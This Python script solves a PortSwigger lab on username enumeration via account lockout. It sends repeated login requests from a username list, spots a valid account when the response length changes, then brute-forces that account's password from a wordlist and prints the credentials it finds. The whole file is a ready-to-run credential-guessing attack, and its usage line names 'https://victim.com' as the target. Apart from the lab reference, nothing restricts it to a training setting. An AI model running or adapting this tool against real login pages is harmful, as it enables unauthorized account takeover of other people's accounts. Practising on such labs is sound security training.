# https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock
# If the account is locked after multiple attempts, you can enumerate users

import urllib3
import urllib
import sys
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def bruteForce(url):

    print("[ + ] Finding username...")

    cookies = {'session': 'F8azC6YjIRT6vRhsQlntNffwFi4dVpF1'}
    
    usernameFile = open('usernames.txt', 'r')
    linesUsername = usernameFile.read().splitlines()
    for line in linesUsername:

        params = { 
        "username": line, 
        "password": "password", 
    }   
        
        sys.stdout.write('\r' + "Testing user: " + line)
        print(" "*50, end='\r', flush=True)

        rUsername = requests.post(url, verify=False, proxies=proxies, data=params, cookies=cookies)

        # Getting first response content-length
        firstRequestLength = len(rUsername.content)

        for i in range(3):

            rUsername = requests.post(url, verify=False, proxies=proxies, data=params, cookies=cookies)

            # print(firstRequestLength, len(rUsername.content))

            # Comparing first response length with current response length
            if len(rUsername.content) != firstRequestLength:
                print("\n\n------------------------------------")
                print('\r' + "User found: " + line)
                print("------------------------------------")
                print("\n[+] Starting password brute force...")

                username = line

                passwordFile = open('passwords.txt', 'r')
                linesPassword = passwordFile.read().splitlines()
                for line in linesPassword:

                    params = { 
                            "username": username, 
                            "password": line, 
                        }
                    
                    rPassword = requests.post(url, verify=False, proxies=proxies, data=params)

                    sys.stdout.write('\r' + "Testing password: " + line)
                    print(" "*50, end='\r', flush=True)

                    if len(rPassword.content) < firstRequestLength:
                        password = line
                        print("\n\n------------------------------------")
                        print("Password found: " + password)
                        print("------------------------------------")
                        print("\nCredentials: %s - %s" % (username, password))

                        return
                break

def main():
    if len(sys.argv) != 2:
        print("Usage: %s <URL>" % sys.argv[0])
        print("Example: %s https://victim.com" % sys.argv[0])

    url = sys.argv[1]
    bruteForce(url)

if __name__ == "__main__":
    main() 
